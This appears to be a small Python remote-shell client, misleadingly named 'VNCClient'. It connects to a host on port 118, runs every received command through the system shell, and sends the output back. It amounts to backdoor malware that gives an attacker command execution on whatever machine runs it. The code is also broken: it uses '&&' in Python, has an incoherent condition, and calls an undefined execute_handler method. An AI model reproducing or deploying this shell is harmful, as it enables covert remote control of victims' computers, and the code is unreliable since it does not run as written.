import socket
from subprocess import check_output
import subprocess
from lib.host import ipadd


class VNCClient:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))
        self.data = "Connected"
        while True:
            self.a = self.s.recv(1024)
            self.a = self.a.decode()
            if self.a != 'X':
                print("WIN")
                print(f"command = {self.a}")
                if self.a[-3:] == 'exe' && self.a[:-3] == 'mkdir':
                    self.logg = check_output(self.a, shell=True)
                    self.logg = str(self.logg)
                    self.s.send(self.logg.encode())
                else:
                    self.cmd_process = subprocess.run(
                        self.a, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    self.cmd_process = self.cmd_process.stdout + self.cmd_process.stderr
                    self.s.send(self.cmd_process)
            elif self.a == 'X':
                print(f"command = {self.a}")


myclient = VNCClient(ipadd, 118)
myclient.execute_handler()
